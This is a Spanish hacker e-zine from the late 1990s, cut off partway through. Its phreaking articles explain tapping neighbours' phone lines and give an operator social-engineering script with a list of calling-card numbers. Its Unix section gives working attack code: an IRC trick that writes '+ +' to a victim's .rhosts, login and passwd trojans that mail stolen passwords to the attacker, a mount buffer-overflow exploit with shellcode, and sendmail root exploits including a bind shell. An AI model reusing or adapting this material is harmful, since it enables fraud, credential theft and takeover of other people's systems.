				ZeD-world-ezine n.2

Puedes distribuir este e-zine,en tu web,bbs o ftp libremente,pero me gustaria que me lo 
digeses antes de hacerlo,enviame un e-mail a:
zed@mixmail.com

ZeD no se hace responsable del mal uso o daños que pueda causar el uso de la informacion 
contenida en este e-zine (que lo sepas).

      web oficial del e-zine:www.angelfire.com/ak/HACKZED/ZED2.html
    miembro oficial del HaCk`S-wEb-RiNg (http://come.to/HaCkS-wEb-RiNg)
La gran mayoria de los textos aqui expuestos, son textos pillados de paginas personales,si 
alguno es tullo y no quieres que aparezca,dimelo y lo quitare.

editor : ZeD
colaboradores :LordVader ---
               Roman Soft--- 
              ¿nadie mas? aver si colaborais que es gratis hombre
	si quieres colaborar en este e-zine manda tu articulo en formato "txt" a mi direccion de 
e-mail : zed@mixmail.com
y sera publicado en el siguiente nº, gracias.

					CONTENIDOS
----------------------------------------------------------------------------------
1. La BeigeBox en españa
2. Calling Cards
3. Donde se encuentran los ficheros de password en los sistemas mas utilizados
4. UNIX/LINUX hack
5. Tácticas de guerra en el IRC
6. Bombas en JavaScript
7. Actualizacion del texto "como trucar el Güindows95"
8. Listado de los Pass mas utilizados
8.1 Como elejir una buena contraseña
9. Ladrones de guante blanco
10. Como se hacer virus sencillos (que no inutiles)
11. Guia del PGP v.2.6.3¡
12. Noticias de la red
13. Despedida y cierre
----------------------------------------------------------------------------------

                                                  LA BEIGE BOX EN ESPAÑA
                               por: PaKiTo eL cHoKoLaTeRo                                 
            
Ante todo, este texto est  escrito £nicamente con fines educacionales y yo no
me hago responsable del mal uso que se le pueda dar!

Bueno, supongo que muchos de vosotros habreis oido hablar de las boxes, o
cajitas para hacer cosas a los telefonos. Posiblemente conozcais la blue box,
o la black box, ya que son las m s populares. Pues yo os voy a hablar de la
beige box, que es la m s sencilla de todas.

Puede que muchos de vosotros hayais leido documentos en ingl‚s sobre ello,
pero en Espa¤a todo es much¡simo m s f cil.

Necesitar s un peque¤o destornillador de estrella o unas pinzas,uno m s grande
y plano para reventar la caja, un tel‚fono al que le puedas quitar el jack
(el enchufe ese), y unas buenas piernas para correr si te pillan :)

Lo primero de todo es encontrar un cajet¡n de telonos en la calle. En las
zonas con bloques de pisos no encontrareis, ya que se encuentran en las
fachadas de los edificios (creo), pero en las zonas de chalets y casas de 
plantas bajas suele haber. Son grises, y suelen tener unos n£meros fuera y el 
s¡mbolo de telef¢nica. Tienen la t¡pica cerradura que es un triangulo. Los hay 
de pl stico y de metal. Si encontrais una de pl stico, cojonudo, la fuerzas 
con un destornillador, o con las manos (que tampoco cuesta mucho) y haceis lo 
que ahora explicar‚. Si lo encontrais de metal, probad de forzarlo, que aunque
cuesta m s, tambien se puede.

Si mirais dentro del cajet¡n, os encontrareis que los cables van conectados
por los lados, y arriba habr  una especie de enchufe atado con hilo de pescar
as¡:

            1 > ³    ³ < 1          Los palotes (1) son de metal
               ÚÁ¿  ÚÁ¿
               ³ ÀÄÂÙ ³----------- Aqu¡ hay una separaci¢n, y se desmonta con
               ³   ³  ³            dos tornillos que hay
               ³   ³  ³
               ÀÂÒÄÁÒÂÙ                      
                ³    ³ < Esto son la continuaci¢n de los palotes, y las rallas
                ³    ³   dobles son como unos enganches que de perfil se verian
                         as¡:
                                º
                               Í¼
(Si no est  busca en otro, que seguro que ya se lo ha llevado alg£n espabilao)
Lo arrancamos y nos lo llevamos a casa, cerrando el cajet¡n para que no se vea
abierto.
Si alguien est  ansioso, en vez de llevarselo para endi¤arlo al tel‚fono, 
puede poner dos pinzas en los extremos de los cables del telefono y pincharlos
a la parte de arriba de los palotes, enchufando el "enchufe" en cualquier
bujero de la caja. Si no sabes como enchufarlo sigue las instrucciones de la
parte interior de la tapa de la caja :)
Pero bueno, a lo que ¡bamos.
Nos llevamos el enchufe y le quitamos los tornillos, as¡ veremos que no es m s
que un asqueroso cacho de pl stico con dos muelles y dos cachos de hierro :)
Bueno, ahora cortamos el cable del telefono, que en teor¡a ha de tener dos
cables. Si tiene 3, posiblemente lo hayais robado de alg£n hotel o cualquiera
de estos sitios que hay que pasar por una "centralita" interna para llamr fue-
ra. Aqu¡ sobra un cable, que ser  el que no corresponda a una pareja. Estas
son : rojo y verde; y blanco y marr¢n. Si tiene cuatro mirad en el jack que
habeis cortado cuales son los dos colores que van al centro, y esos son. De
todas formas si tiene cuatro le podeis endi¤ar dos a cada lado, teniendo en
cuenta que los de un mismo par no pueden estar juntos (has enchufado alguna 
vez las dos partes de un enchufe en un solo bujero).
Bueno, ahora los metemos donde van los palotes y luego metemos los palotes, de
modo que hagan contacto los cables y los palotes y estos est‚n como antes.

Ahora solo queda montar los tornillos, ir al cajet¡n y enchufar el enchufe
(valga la redundancia) en cualquier sitio que est‚ usado (tienen que entrar
dos cables por el lado y lo negro enroscado hacia dentro). Entonces toca dar
l¡nea.

Ahora ya puedes llamar, pero ten en cuenta que est s usando la l¡nea de otra
persona igualmente que si tuviera dos tel‚fonos y llamases desde uno de ellos.
Personalmente prefiero frecuentar zonas de ricos y llamar desde all¡, ya que
siempre suelen vivir en casas, donde hay cajetines a saco, y adem s como
tienen pelas no nos tenemos que preocupar de arruinar a alg£n pobre trabajador
explotado por el sistema!

Otra cosa que no he podido probar :((( es pillar la l¡nea de otra persona y la
tuya a la vez. Para ello has de encontrar tu cajet¡n (sigue el cable)y 
encontrar tu l¡nea (una forma sencilla de hacerlo es llevarte tu beige box y 
llamar a t£ casa. Si comunica, puede serlo, pero para asegurarse, se puede 
descolgar el tel‚fono de tu casa, poner m£sica a toda hostia en el micro del
tel‚fono, y si con tu beige box la oyes, has acertado!).
Una vez tienes la l¡nea que es, mira el cable negro gordo de tu l¡nea, y
dentro toca haber 2 m s, que son de una l¡nea auxiliar y est n sin usar, a no
ser que tengas 2 l¡neas. Enchufalos en otro sitio, dejando tambi‚n los suyos
enchufados, y una vez en tu casa, ya sabes, pilla el cable negro y ya tienes
otra l¡nea. Antes de nada, mirad el PCR (el cacharro ese que ponen al entrar
la l¡nea en tu casa) y mirad si se puede pillar de ah¡. Yo no lo he mirado
porque no tengo :((, pero probad y ya me direis cosas.
Ah, si lo usais y teneis centralita digital (por lo de la facturaci¢n detalla-
da), si llamais a alg£n n£mero que salga (no salen los metropolitanos, pero
Infov¡a SI sale) no os olvideis de que cuando llegue la factura teneis que 
volver a dejar la l¡nea igual en el cajet¡n, porque si tus vecinos se quejan
y a la telef¢nica le da por investigar .....

Bueno, espero que me haya explicado bien, y si, es as¡ de sencillo.
Si hay alguna duda, no os corteis en preguntarme.
Espero que os sea de utilidad y tambien que no haya aburrido a nadie.
                                            
Saludosh!                        
eL HeRMaNo aKRaTa del TeMPLo / PaKiTo eL CHoKoLaTeRo / DaRKNeT:  66:666/1.53
((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((()))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))

                                                                  CALLING CARDS
                                                         by:Crackers-Brain

Una calling card no es más que un número que te da una compañía telefónica para poder hacer 
llamadas. Estas compañías pueden ser las típicas compañías telefónicas de cada pais, o 
empresas especializadas en servicios telefónicos, que ofrecen la posibilidad de hacer 
llamadas internacionales por un precio más bajo de lo normal. Las cards pueden cobrarse con 
la factura del abonado si se trata de una compañía telefónica, o de otras múltiples maneras. 
Normalmente las cards estan compuestas por un número y un PIN, donde los primeros son de 10 
cifras, y el pin de 4, aunque pueden haber bastantes variantes. Estos números los da la 
propia compañía, y no suelen corresponderse con los algoritmos de ningún tipo de tarjeta de 
crédito. 
Algunas de estas empresas permiten usar ViSA, claro que después de entrarla, pide un 'telecode' 
o pin, que se supone te lo proporciona la propia compañía, lo que hace suponer a su vez que 
has de dar de 'alta' esa ViSA en su servicio antes de poder realizar llamadas. De todos modos, 
este es un tema donde se podría investigar e intentar saber si realmente el código que piden 
no tiene nada que ver con la tarjeta o si ,por lo contrario, es la fecha de expiración, las 
cuatro últimas cifras, o algún tipo de combinación de las cifras que componen la tarjeta de 
crédito en cuestión. 
.. Destacar que AT&T estuvo haciendo pruebas durante el verano del 95 donde se podía usar una 
ViSA y su fecha de caducidad para realizar llamadas. Desfortunadamente, esta posibilidad duro 
bastante poco, pero nunca se puede descartar que exista algun 900 de AT&T que lo permita, o 
que haya otra compañía donde también se pueda. 
Las cards mas conocidas son sin duda las de AT&T, que han sido usadas y abusadas durante mucho 
tiempo. Pero en los escaneos de 900 se encuentran muchos teléfonos de compañías que ofrecen 
estos servicios y que no son tan conocidas, aunque no por esto, menos válidas ! 
Normalmente, las compañías telefónicas de cada pais tienen un sitema de calling cards, al 
que se accede llamando al 900 99 00 XX , siendo XX el código telefónicodel pais. Así, 
Alemania sería 900 99 00 49 , AT&T es 900 99 00 11, etc.. Hay paises donde varía ligeramente 
este esquema, teneis una lista en el listín telefónico con todos los paises que tienen el 
Servicio Directo Pais y la mayoría son automatizados usando calling cards. 
Total, que para usar estas cards, tendreis que conseguirlas, vosotros sabreis como. Pensad 
que hay muchas empresas que usan estos servicios para llamadas internacionales, aunque 
suelen llamar a un numero local. Todo es conseguir esa card. Otra posibilidad es ir 
investigando si hay algun tipo de default, o una vez tengais una, hacer pruebas, o lo que os 
de la gana. En algunos paises, hay prepaid cards de la o las compañías Telefónicas que son 
tarjetas con un crédito X que va bajando, como si se tratara de una de las smartcards de 
Telefónica, con un número que se puede usar a través de estos servicios. Este tipo de tarjeta 
no suele tener PiN, así que con saber algún número, es probable que podais deducir el patrón 
que usan y aprovecharos de ello. 
Este sería el método a seguir: 
Llamais a AT&T al número gratuito 900 99 00 11 desde España (desde un teléfono fijo o desde 
una cabina.) 
Ejemplo práctico: 
Marco 900 99 00 11 
"Pirirín!!" (musiquilla). Despues dice algo como: "AT&T. To make a call or a ... bla bla bla"). 
Esperais a que os salga una operadora que dice: 
OPERADORA> "AT&T can I help you?" 
PHREAKER> in Spanish, please. 
(para los que no tengais ni idea de inglés: se pronuncia: "in espanish, plis" o si no, 
directamente le dices: "Deseo hablar en Español") 
OPERADORA> ¿Que desea? 
PHREAKER> Deseo hacer una llamda con mi Calling Card.
OPERADORA> Muy bien, a los EE.UU/Canada o llamada de larga distancia? 
PHREAKER> Es una llamada internacional.
(Supongamos que queremos llamar a un amigo que esta en Londres, cuyo # de Teléfono es: 895064 
y que está en Cambridge. Entonces el número es 44 1223 895064. 
(U.K)+Cambridge+núm. 
OPERADORA> Su numero de Calling Card, por favor.
PHREAKER> 23389562339956
OPERADORA> Espere...
PHREAKER> :D 
Hay dos opciones: 
a) OPERADORA> Te pide el # de teléfono y sale todo bien.
b) OPERADORA> Te dice que: "El # de Calling Card ha expirado o no es válido". 
Si sale la opción b) no cuelgues, actua con total tranquilidad y naturalidad, y le dices 
tranquilamente que deseas comprobarlo de nuevo (y le dices otro # de tarjeta...) 
Tarde o temprano, siempre funciona.
Y AHI VAN LOS NÚMEROS de Calling Cards válidos que he conseguido: 
¡Pronto, segunda entrega con más números! 
61228956677349
06773401667340
62390672339061
51278451112895
61289566734406
67340167340111
28956128956222
89562734401673
40172239067785
01784511278451
22239066233906
99562389556233
40116734017833
01177884445500
11778884455111
22338889955566
23399444551122
89955666667773
49990066773334
99006677333440
11199006677733
77788334440055
55661112288999
67722339990000
78844555112227
44555556622333
40178895661289
56238895623344 
01673401778340
88451283906772
00673490673401
16734051289945
12895612889506
73490673401167
34051284450178
45017845116239
05623906662390
61784500178451
17845116239056 
*********************************************************************************
********************************************************************************* 
Así pués, aquí teneis los 900 , más algun otro que he considerado que puede ser interesante y 
que también tienen relación con las susodichas compañías telefónicas. Sería interesante que 
la lista se fuera ampliando, por lo tanto, si encontrais algun 900 que tuviera cabida aquí, 
no dudeis en enviarmelo. Igualmente, si alguno de estos deja de funcionar, mensaje al canto 
para poder mantener la lista lo más actualizada posible. 
Compañía---Teléfono---Comentarios 
AT&T ----- 900 99 12 35----- AT&T Teleticket Service
900 95 11 63----- AT&T Card - Aleman
900 95 11 64----- AT&T Card - Italiano
900 95 11 65 ----- AT&T Card - Japones 
Citizen Com.----- 900 95 14 30----- Citizen Comunications 
Conquest----- 900 94 14 30----- Conquest 
Dial Services----- 900 99 10 23 ----- Dial Services 
Global One----- 900 97 13 41----- Global One
VISA----- 900 96 13 26----- Global One - Japones
VISA----- 900 96 13 27----- Global One - Italiano
VISA----- 900 99 44 31----- Global One Prepaid 
MCI----- 900 94 14 29----- MCI Prepaid Calling Card Service
900 94 11 35----- MCI Customer Support 
Sprint----- 900 99 13 54----- Sprint Prepaid Calling
900 95 11 68----- Sprint Prepaid Calling 
Telstra----- 900 99 61 55----- Telstra International Free Calls
900 99 61 49----- Telstra International Free Calls INFO
900 99 61 42 ----- Telstra ViSA
900 99 61 68----- Telstra Phone Service 
Viatel----- 900 94 14 03 ----- Viatel
900 99 10 76----- Viatel
900 97 14 14----- Viatel 
World Telecom----- 900 98 14 24----- World Telecom
900 97 44 89----- World Telecom 
////////////////////////////////////////////////////////////////////////////////////////////\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\                           

3.             ¿donde se encuentran los ficheros
                        de password?

Todos los sistemas mas utilizados del momento tienen un directorio especial en el que los 
Root del sistema guardan los ficheros que contienen los password de los ususarios.Aqui 
descubriras cuales son esos directorios:

AIX 3                 /etc/security/passwd
                                  /tcb/auth/files/<first letter
                               of username>/<username>

A/UX 3.0s             /tcb/files/auth/?/*

BSD4.3-Reno           /etc/master.passwd              

ConvexOS 10           /etc/shadpw                     

ConvexOS 11           /etc/shadow                     

DG/UX                 /etc/tcb/aa/user/               

EP/IX                 /etc/shadow                     

HP-UX                 /.secure/etc/passwd             

IRIX 5                /etc/shadow                     

Linux 1.1             /etc/shadow                     

OSF/1                 /etc/passwd[.dir|.pag]          

SCO Unix #.2.x        /tcb/auth/files/<first letter                             
		      of username>/<username>

SunOS4.1+c2           /etc/security/passwd.adjunct    

SunOS 5.0             /etc/shadow
                      <optional NIS+ private secure maps/tables/whatever>

System V Release 4.0  /etc/shadow                     

System V Release 4.2  /etc/security/* database

Ultrix 4              /etc/auth[.dir|.pag]            

UNICOS                /etc/udb                        
¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤
¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤

4.                  UNIX/LINUX HacK
                    por:Raven Spirit 

Hola a todos. Espero que los que leais este documento comprendais como se
hackea un unix. Por supuesto es demasiado dificil desencriptar la cuenta del root,
por lo que solo se utiliza en casos extremos, asi como los programas tipo dictmake
solo se usan en casos muy raros y cuando no nos queda otro recurso.
Empezamos. Antes de empezar me gustaria que quedara claro que si quereis ser
hackers en serio necesitais linux, no es absolutamente necesario pero facilita
muchisimo las cosas.
(* no es por recalcar pero yo os lo advertí, asi que allá vosotros........)
Para hackear un unix la primera cosa que necesitamos es, logico, introducirse
en el sistema. Algunos otros ordenadores tienes ftpïs anonimos a los que
podemos acceder, pero hacedme caso, no servir para nada.
Para introducirnos en un sistema necesitamos que tenga al menos una parte de
acceso publico. Generalmente esa parte es la famosa pantalla " Login: y
Password: " que me imagino que todos conocereis.
Esta pantalla simplemente vale para identificar que la entrada de un usuario
en ese sistema sea legitima. Sin embargo esas tontas maquinas que solo saben
la diferencia entre 0 y 1 si les damos un login y password que esten dados
de alta en ese sistema nos dejara pasar ( a no ser que tengan un sistema de
reconocimiento de IP para lo que necesitariamos hacer IP-Spoofing , pero esto
solo nos ocurrira en ciertos ordenadores de alta seguridad ). ¨ Como conseguir
acceso al sistema ? La manera mas facil, la ingenieria social. No creo que
haga falta explicar eso. Simplemente podeis utilizar en comando finger, para
los que useis linux y los que no usais el finger del mIrc. Este comando nos
dara informacion sobre el titular del e-mail que nostros le demos, que segun
la maquina sera, o mas o menos o a veces nada. Menos da una piedra. Si estais
desde linux podeis usar comandos "r" como "rlogin loquesea.com -l loginquesea"
esto os mete en el sistema, pero hay que conseguir una cuenta para poder usar
los exploits que explicar‚ mas adelante. Sin embargo hay otras maneras de
conseguir acceso al sistema, como por ejemplo la que explico ahora.
COMO ACCEDER A UN ORDENADOR HACKEANDO DESDE EL IRC:
Esto solo lo podeis hacer desde linux, yo lo he probado desde win95 y 3.1 y
no lo he conseguido hacer. Primero hacemos un /whois #uncanalconmuchagente
para encontrar si hay alguien que se conecte desde un unix, que normalmente
ser una universidad. El unico problema que tiene esto es que no podemos
elegir el ordenador, pero de todas maneras es muy divertido.
Lo unico que necesitamos es meter la cadena + + en su fichero /.rhosts y la
verdad es que es una tonteria tremenda.
Buscamos a la victima y vamos a un canal donde este el, despues le hablaremos
desde un privado. Ahora entra la imaginacion de cada uno, porque tenemos que
mandarle un fichero por DCC ( por ejemplo prueba.irc ) y que el escriba:
/load prueba.irc Me imagino que vuestra imaginacion os ayudara a resolverlo.
Lo primero es conseguir el fichero prueba.irc. Solo esta linea :
/exec echo: "/exec echo + + > $HOME/.rhosts >> prueba.irc 
Ya tenemos el fichero prueba, lo mejor es que para que no se de cuenta podemos
a¤adirle alguna conachada que se nos ocurra ( alla cada uno se las apa¤e ).
Listo. Cuando el tio en cuestion escriba /load prueba.irc nosotros ejecutamos
% rlogin ordenador_de_la_victima.com -l login_de_la_victima
Ya estamos dentro. Facil ¨ No ?
Y para terminar un truquillo que quizas os valga para algo, simplemente
cambiamos la paridad de nuestro modem a 7E1 y telneteamos al ordenador en
cuestion. Si hemos tenido suerte, cuando alguien intente conectarse, nos
"colaremos" en su lugar.
Despues de todo esto se supone que ya estamos dentro. Ahora hay que, o sacar
una cuenta si no la tenemos o conseguir privilegios de root. Para lo primero:
- Podemos usar el archirenombrado /ect/passwd ( si tenemos privilegios para
leerlo ) y crackearlo pero si quereis mi consejo solo usad el fichero passwd
para conseguir una cuenta cualquiera en el sistema y poder ejecutar comandos
en ‚l, poder usar un bug o exploit.
- Usar un trojan o Caballo De Troya, esta opcion tambien requiere tiempo pero
por supuesto menos que crackear el fichero passwd, por que funciona en cuanto
cualguier usuario se conecte al sistema. ATENCION, si conseguimos la cuenta
del root nos podremos saltar el paso " conseguir privilegios de root ", aunque
los sysadmins, algunos, pueden sospechar aunque la verdad es que despues de
hackear durante un tiempo te das cuenta de lo estupidos que pueden llegar a
ser. Quizas sea una de las mejores formas. Un caballo de troya es un fichero
que metido en el sistema hace que un usuario crea que ha introducido su
password mal, pero en realidad el password es enviado a la direccion de correo
que nosostros le digamos. Aqui incluyo uno, pero acordaos de ponerle la
direccion a la que quereis que os mande el passwd, y ademas en algunos
sistemas en lugar de "Login:" nos dice : "marte login: " o algo distinto de
login, por lo que tambien lo tenemos que cambiar para que nadie note la
diferencia. Este es :
------SCRIPT------
#!/bin/sh
rm -rf $0
cp $HOME/.login $HOME/.l
echo ''>$HOME/.hushlogin
echo "stty intr '^@'
echo 'Login incorrect'
echo -n 'login: '
echo $<>.t
echo -n 'Password: '
stty -echo
echo $<>>.t
mail tunombre@tudirecciondecorreoanonima<.t
rm .t
cat /etc/motd
mv .l .login
rm .hushlogin
stty echo
source .login">$HOME/.login
----END SCRIPT----
Este tipo de scripts tambien se pueden usar en /bin/passwd, para cuando un
usuario cambie su contraseña pero el problema es que no es muy normal que
un usuario cambie su contrase¤a, o por lo menos pasa muy de vez en cuando.
Para mayor seguridad lo mejor es poner el que esta arriba,( para el caso es
mejor poner los dos ) pero sin embargo aqui pongo el otro, por si acaso
( acordaos de la direccion de correo ) :
------SCRIPT------
#!/bin/tcsh
echo -n "Changing password for $USER on ";hostname
echo -n "Old password: "
stty -echo
echo $<>$HOME/.tym
echo "" 
echo -n "New password: "
echo $<>>$HOME/.tym
echo ""
stty echo
mail tunombre@tudirecciondecorreoanonima<$HOME/.tym
rm $HOME/.tym
echo "Error: Incorrect Password"
rm -f $0
unalias /bin/passwd
unalias passwd
---END SCRIPT---
La ventaja que tienen estos dos scripts es que no influye que el fichero
passwd este shadowed o no.
Creo que con esto nos llega para conseguir una cuenta en un ordenador normal.
Pasamos a lo siguiente, conseguir los privilegios de root.
Para conseguir privilegios de root en un sistema NO hace falta desencriptar
la cuenta del root del fichero passwd. Para ser root recurrimos a los bugs y
a los exploits. Los bugs son "agujeros" en el dise¤o del SSOO y se suelen
encontrar en listas de correo de seguridad, aunque hay algunas webs donde
estan recopilados. Los exploits son programas que utilizan esos bugs para
conseguirnos privilegios de root, aunque no es para lo unico que sirven, me
refiero a que podemos usar un exploit para leer el correo de alguien, para
ocultar lo que estemos haciendo en el ordenador etc...
Los exploits son ficheros de codigo .c que hay que compilar en el ordenador
a hackear. Se meten por ftp y se compilan:
% cc -o loquesea loquesea.c
% loquesea
Listo. Hay algunos que requieren una manera especial de utilizacion, pero
lo indica claramente si editamos el fichero.
Los bugs y exploits suelen estar clasificados por sistemas, para que sea mas
facil localizarlos. La verdad es que os recomiendo tener los exploits y bugs
en vuestro ordenador ordenados por directorios, para que no perdais el tiempo
la paciencia buscandolos.
Para que tengais alguna ayuda os voy a poner aqui unos cuantos:
Quizas este ya lo conozcais, es el mount, y funciona en casi todos los linux:
<-------------------------------------CORTAD AQUI--------------------------->
/* Mount Exploit for Linux, Jul 30 1996
Discovered and Coded by Bloodmask & Vio
Covin Security 1996
*/
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <sys/stat.h>
#define PATH_MOUNT "/bin/umount"
#define BUFFER_SIZE 1024
#define DEFAULT_OFFSET 50
u_long get_esp()
{
__asm__("movl %esp, %eax");
}
main(int argc, char **argv)
{
u_char execshell[] =
"\xeb\x24\x5e\x8d\x1e\x89\x5e\x0b\x33\xd2\x89\x56\x07\x89\x56\x0f"
"\xb8\x1b\x56\x34\x12\x35\x10\x56\x34\x12\x8d\x4e\x0b\x8b\xd1\xcd"
"\x80\x33\xc0\x40\xcd\x80\xe8\xd7\xff\xff\xff/bin/sh";
char *buff = NULL;
unsigned long *addr_ptr = NULL;
char *ptr = NULL;
int i;
int ofs = DEFAULT_OFFSET;
buff = malloc(4096);
if(!buff)
{
printf("can't allocate memory\n");
exit(0);
}
ptr = buff;
/* fill start of buffer with nops */
memset(ptr, 0x90, BUFFER_SIZE-strlen(execshell));
ptr += BUFFER_SIZE-strlen(execshell);
/* stick asm code into the buffer */
for(i=0;i < strlen(execshell);i++)
*(ptr++) = execshell[i];
addr_ptr = (long *)ptr;
for(i=0;i < (8/4);i++)
*(addr_ptr++) = get_esp() + ofs;
ptr = (char *)addr_ptr;
*ptr = 0;
(void)alarm((u_int)0);
printf("Discovered and Coded by Bloodmask and Vio, Covin 1996\n");
execl(PATH_MOUNT, "mount", buff, NULL);
}
<--------------------------------------FINAL-------------------------------->
Este otro exploit os dara un shell de root en los ordenadores que usen el
sendmail 8.6.4, este es el codigo original, leed las lineas que empiecen por
# porque es lo que teneis que escribir vosotros por que es distinto en cada
sistema:
<--------------------------------CORTAD AQUI-------------------------------->
# location of sendmail
SENDMAIL=/usr/lib/sendmail
# location of original sendmail.cf file
CONFIG=/nau/local/lib/mail/sendmail.cf
#CONFIG=`strings $SENDMAIL | grep sendmail.cf`
# program to execute as root
SHELL=/bin/csh
TEMPDIR=/tmp/sendbug-tmp.$$
mkdir $TEMPDIR
chmod 700 $TEMPDIR
cd $TEMPDIR
cp $SENDMAIL sm
chmod 700 sm
echo "Creating setid0 ..."
cat > setid.c << _EOF_
/* set uid to zero, thus escaping the annoying csh and solaris sh
* problem..
*
* if (getuid() != geteuid()) {
* printf("permission denied, you root-hacker you.\n");
* exit(1);
* }
*
* .. must be run euid 0, obviously. with no args it runs /bin/sh,
* otherwise it runs the 1st arg.
*/
#include <stdio.h>
main(argc, argv)
int argc;
char *argv[];
int uid;
setuid(0);
setgid(0);
seteuid(0); /* probabally redundant. */
setegid(0);
uid = getuid();
if (uid != 0) {
printf("setuid(0); failed! aborting..\n");
exit(1);
}
if (argc !=2) {
printf("executing /bin/sh...\n");
system("/bin/sh");
}
else
{
printf("executing %s...\n", argv[1]);
system(argv[1]);
}
_EOF_
cc -o setid0 setid.c
echo "Creating calc..."
cat > calc.c << _EOF_
/*
* Determines offset in sendmail of
* sendmail.cf file location.
* author: timothy newsham
*/
#include <fcntl.h>
gencore()
int pid;
int fd[2];
if(pipe(fd) < 0) {
perror("pipe");
exit(1);
return(0);
}
pid = fork();
if(!pid) {
int f = open("./out", O_RDWR|O_CREAT, 0666);
dup2(f, 1); dup2(fd[0], 0);
close(f); close(fd[1]); close(fd[0]);
execl("./sm","sm","-d0-9.90","-oQ.","-bs", 0);
perror("exec");
exit(0);
} else {
sleep(2);
kill(pid, 11);
}
close(fd[0]);
close(fd[1]);
main(argc,argv)
char **argv;
int argc;
unsigned int ConfFile,tTdvect,off;
gencore();
sync(); /* grr. */
tTdvect = find("ZZZZZZZZ", "core");
ConfFile = find(argv[1], "core");
if(!tTdvect || !ConfFile) {
return(1);
}
off = ConfFile - tTdvect;
printf("-d%u.%d,%u.%d,%u.%d,%u.%d,%u.%d,%u.%d,%u.%d,%u.%d,%u.%d,%u.%d,%u.0\n",
off, '/', off+1, 't', off+2, 'm', off+3, 'p', off+4, '/', off+5, 's', \
off+6, 'm', off+7, '.', off+8, 'c', off+9, 'f', off+10);
int find(pattern, file)
char *pattern,*file;
int fd;
int i, addr;
char c;
fd = open(file, 0);
i = 0;
addr = 0;
while(read(fd, &c, 1) == 1) {
if(pattern[i] == c)
i++;
else
i=0;
if(pattern[i] == '\0') {
addr -= strlen(pattern);
return(addr);
}
addr++;
}
return(0);
_EOF_
cc calc.c -o calc
echo "Scanning core image for $CONFIG..."
DEBUGFLAGS=`calc $CONFIG`
echo "Creating alias.sh ..."
echo "#!/bin/sh
# this program will be executed when mail is sent to the fake alias.
# since solaris sh and csh and tcsh refuse to run when euid != realuid,
# we instead run the program we compiled above.
/bin/chmod 6777 $TEMPDIR/setid0
/bin/chown root $TEMPDIR/setid0
/bin/sync
" > alias.sh
chmod 755 alias.sh
echo "Creating fake alias file..."
echo "yash: |$TEMPDIR/alias.sh" > aliases
echo "Faking alias pointer in new config file..."
egrep -v '(OA|DZ|Ou|Og)' $CONFIG > /tmp/sm.cf
echo "
# hacks follow
OA/$TEMPDIR/aliases # our fake alias file
Ou0 # user ID to run as
Og0 # group ID to run as
DZWHOOP-v1.0" >> /tmp/sm.cf
echo "Creating the sendmail script..."
cat > sendmail.script << _EOF_
helo
mail from: <nobody>
rcpt to: <yash>
data
yet another sendmail hole? suid whoop?
\. # oops.. delete \ prior to execution
quit
_EOF_
echo "Executing $SENDMAIL $DEBUGFLAGS -bs..."
$SENDMAIL $DEBUGFLAGS -bs < sendmail.script
# give it time to execute.
sleep 4
# cleanup in 5 seconds
(sleep 5; rm -rf $TEMPDIR ; rm /tmp/sm.cf) &
if [ -u setid0 ]
then
echo "setid0 is a suid shell. executing..."
cd /
$TEMPDIR/setid0 /bin/csh
echo "end of script."
exit 0
else
echo "setid0 is not suid; script failed."
echo "apparently, you don't have the bug. celebrate :-)"
exit 1
fi
<----------------------------------FINAL------------------------------------->
Este otro os har root en los ssoo con el sendmail 4.x
<-------------------------------CORTAR AQUI---------------------------------->
#!/bin/sh
# Uso: smail <hostname> <target-user-name> <target-port> <shell command>
# Defecto: smail <localhost> <daemon> <7001> </bin/sh>
port=$3
user=$2
cmd=$4
if [ -z "$2" ]; then
user=daemon
fi
if [ -z "$3" ]; then
port=7002
fi
if [ -z "$4" ]; then
cmd="/bin/csh -i"
fi
(
sleep 4
echo "helo"
echo "mail from: |"
echo "rcpt to: bounce"
echo "data"
echo "."
sleep 3
echo "mail from: $user"
echo "rcpt to: | sed '1,/^$/d' | sh"
echo "data"
echo "cat > /tmp/a.c <<EOF"
cat << EOF
#include <sys/types.h>
#include <sys/signal.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netdb.h>
reap(){int s;while(wait(&s)!=-1);}main(ac,av)int ac;
int **av;{struct sockaddr_in mya;struct servent *sp
;fd_set muf;int myfd,new,x,maxfd=getdtablesize();
signal(SIGCLD,reap);if((myfd=socket(AF_INET,SOCK_STREAM,
0))<0)exit(1);mya.sin_family=AF_INET;bzero(&mya.sin_addr,
sizeof(mya.sin_addr));if((sp=getservbyname(av[1],"tcp"))
==(struct servent *)0){if(atoi(av[1])<=0)exit(1);mya.sin_port
=htons(atoi(av[1]));}else mya.sin_port=sp->s_port;if(bind(myfd,
(struct sockaddr *)&mya,sizeof(mya)))exit(1);if(listen(myfd,
1)<0)exit(1);loop: FD_ZERO(&muf);FD_SET(myfd,&muf);if
(select(myfd+1,&muf,0,0,0)!=1||!FD_ISSET(myfd,&muf))goto
loop;if((new=accept(myfd,0,0))<0)goto loop;if(fork()
==0){for(x=2;x<maxfd;x++)if(x!=new)close(x);for(x=0;x<
NSIG;x++)signal(x,SIG_DFL);dup2(new,0);close(new);dup2
(0,1);dup2(0,2);execv(av[2],av+2);exit(1);}close(new);
goto loop;} 
EOF
echo "EOF"
echo "cd /tmp"
echo "/bin/cc /tmp/a.c"
echo "/bin/rm a.c"
echo "/tmp/a.out $port $cmd"
echo "."
echo "quit"
) | mconnect $1
<------------------------------------FINAL----------------------------------->
Y por ultimo este otro, que no es para ser root, si no para ocultar ficheros
en un directorio, que no se veran al hacer "ls". Este fichero se copia en
/bin/ls sobreescribiendo al original.
Lo de siempre, es el codigo original, leed los /*.
<----------------------------------CORTAR AQUI------------------------------->
#ifndef lint
